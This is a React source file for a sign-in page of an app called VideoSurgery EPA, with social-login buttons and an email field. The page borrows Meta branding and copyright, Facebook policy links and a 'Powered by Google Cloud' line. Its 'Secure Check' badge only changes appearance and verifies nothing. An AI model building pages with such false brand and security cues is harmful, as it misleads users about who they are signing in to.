import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { getLoginUrl } from "@/const";
import { useAuth } from "@/contexts/AuthContext";

const providers = [
  { id: "facebook", label: "Continue with Facebook", icon: "f", color: "#1877f2" },
  { id: "google", label: "Continue with Google", icon: "G", color: "#34a853" },
  { id: "microsoft", label: "Continue with Microsoft", icon: "■", color: "#5e5ce6" },
  { id: "apple", label: "Continue with Apple", icon: "", color: "#111111" },
] as const;

function MetaFooter() {
  return (
    <div className="flex flex-col items-center gap-2 text-[10px] text-neutral-500">
      <div className="text-[11px] font-medium text-neutral-700">from</div>
      <div className="text-lg font-semibold tracking-tight text-neutral-900">∞Meta</div>
      <div className="flex items-center gap-3 underline-offset-2">
        <a href="https://www.facebook.com/terms.php" className="hover:text-neutral-700 hover:underline">
          Terms of service
        </a>
        <a href="https://www.facebook.com/privacy/policy" className="hover:text-neutral-700 hover:underline">
          Privacy policy
        </a>
        <span>©2026 Meta</span>
      </div>
    </div>
  );
}

export function LoginPage() {
  const [, navigate] = useLocation();
  const { user, isLoading } = useAuth();
  const [email, setEmail] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);

  useEffect(() => {
    if (!isLoading && user) {
      navigate("/dashboard");
    }
  }, [isLoading, navigate, user]);

  const beginLogin = (provider?: string) => {
    setIsVerifying(true);
    const destination = getLoginUrl("/dashboard", {
      email,
      provider: provider ?? undefined,
    });

    window.location.href = destination;
  };

  return (
    <div className="relative min-h-screen overflow-hidden bg-[#f8f8f6] text-neutral-950 font-sans">
      <div
        aria-hidden="true"
        className="absolute inset-0 opacity-80"
        style={{
          backgroundImage:
            "radial-gradient(circle at 1px 1px, rgba(15, 15, 15, 0.05) 1px, transparent 0)",
          backgroundSize: "22px 22px",
        }}
      />
      <div
        aria-hidden="true"
        className="absolute inset-0"
        style={{
          background:
            "radial-gradient(circle at center, rgba(255,255,255,0) 0%, rgba(248,248,246,0.75) 68%, rgba(248,248,246,1) 100%)",
        }}
      />

      <div className="relative z-10 flex min-h-screen flex-col items-center justify-between px-6 py-10">
        <div className="h-10" />

        <div className="w-full max-w-[316px] rounded-[3px] border border-black/5 bg-white shadow-[0_24px_80px_rgba(15,23,42,0.06)]">
          <div className="px-4 pb-4 pt-7">
            <div className="mx-auto mb-5 flex h-9 w-9 items-center justify-center rounded-[10px] border border-black bg-black text-base font-semibold text-white shadow-[0_8px_20px_rgba(0,0,0,0.12)]">
              ▢
            </div>

            <div className="mb-5 text-center">
              <h1 className="mx-auto max-w-[190px] text-[17px] font-semibold leading-[1.25] tracking-[-0.02em] text-[#1c1c1c]">
                Sign in to VideoSurgery EPA
              </h1>
            </div>

            <div className="space-y-2.5">
              {providers.map((provider) => (
                <button
                  key={provider.id}
                  type="button"
                  onClick={() => beginLogin(provider.id)}
                  className="flex h-[34px] w-full items-center rounded-[3px] border border-[#eceae7] bg-white px-3 text-left text-[11px] text-[#222] transition hover:border-[#dedad5] hover:bg-[#fcfcfb]"
                >
                  <span
                    className="mr-3 inline-flex w-4 shrink-0 items-center justify-center text-[12px] font-semibold"
                    style={{ color: provider.color }}
                  >
                    {provider.icon}
                  </span>
                  <span className="leading-none">{provider.label}</span>
                </button>
              ))}
            </div>

            <div className="my-4 h-px bg-[#f0efed]" />

            <label className="mb-2 block text-[10px] font-medium uppercase tracking-[0.18em] text-[#9a948d]">
              Access email
            </label>
            <input
              type="email"
              placeholder="Enter your email address"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              className="h-[34px] w-full rounded-[3px] border border-[#eceae7] bg-white px-3 text-[11px] text-[#2a2a2a] outline-none placeholder:text-[#b7b1ab] focus:border-[#d8d4cf]"
            />

            <div
              className={`mt-3 rounded-[3px] border border-[#eceae7] bg-[#fbfaf8] px-3 py-3 transition-opacity duration-300 ${
                isVerifying ? "opacity-100" : "opacity-40"
              }`}
            >
              <div className="flex items-center justify-between gap-3 text-[11px] text-[#5d5d5d]">
                <div className="flex items-center gap-2.5">
                  <span
                    className={`inline-flex h-4 w-4 items-center justify-center rounded-full border border-[#d7d7d7] text-[10px] text-[#7c7c7c] ${
                      isVerifying ? "animate-pulse" : ""
                    }`}
                  >
                    ✓
                  </span>
                  <span>{isVerifying ? "Verifying access..." : "Ready for sign in"}</span>
                </div>
                <div className="text-right text-[8px] font-semibold uppercase tracking-[0.08em] text-[#c7772d]">
                  Secure Check
                </div>
              </div>
            </div>

            <button
              type="button"
              onClick={() => beginLogin()}
              disabled={isVerifying}
              className="mt-4 h-[35px] w-full rounded-[4px] bg-[#8d8b88] text-[11px] font-medium text-white transition hover:bg-[#797774] disabled:opacity-50"
            >
              Continue
            </button>
          </div>

          <div className="border-t border-[#f1efed] px-4 py-3 text-center text-[10px] text-[#97918a]">
            Powered by Google Cloud
          </div>
        </div>

        <MetaFooter />
      </div>
    </div>
  );
}
